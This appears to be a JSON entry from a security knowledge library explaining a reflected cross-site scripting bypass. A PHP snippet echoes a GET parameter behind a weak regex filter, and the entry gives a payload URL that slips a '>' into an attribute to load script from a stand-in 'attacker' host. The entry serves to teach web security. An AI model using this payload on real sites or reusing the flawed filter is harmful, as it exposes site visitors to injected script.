{
  "id": "22",
  "name": "Reflected Cross Site Scripting - Including external script ",
  "description": "Reflected Cross Site Scripting - Including external script :<br />Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:<br /><br />&lt;?<br />&nbsp; &nbsp;$re = \"/&lt;script[^&gt;]+src/i\";<br /><br />&nbsp; &nbsp;if (preg_match($re, $_GET['var']))&nbsp;<br />&nbsp; &nbsp;{<br />&nbsp; &nbsp; &nbsp; echo \"Filtered\";<br />&nbsp; &nbsp; &nbsp; return;&nbsp;<br />&nbsp; &nbsp;}<br />&nbsp; &nbsp;echo \"Welcome \".$_GET['var'].\" !\";<br />?&gt;<br /><br />In this scenario there is a regular expression checking if &lt;script [anything but the character: '&gt;' ] src is inserted. This is useful for filtering expressions like<br /><br />&lt;script src=\"http://attacker/xss.js\"&gt;&lt;/script&gt;<br /><br />which is a common attack. But, in this case, it is possible to bypass the sanitization by using the \"&gt;\" character in an attribute between script and src, like this:<br /><br />http://example/?var=&lt;SCRIPT%20a=\"&gt;\"%20SRC=\"http://attacker/xss.js\"&gt;&lt;/SCRIPT&gt;&nbsp;<br />",
  "labels": "",
  "libraryId": "1",
  "guid": "4715e532-b5e6-45ec-8921-a366efd51d3f",
  "isHidden": false,
  "isReadOnlyLibraryEntity": false,
  "libraryGuid": "eef7dcf9-53bd-48e9-849d-21445ebad101"
}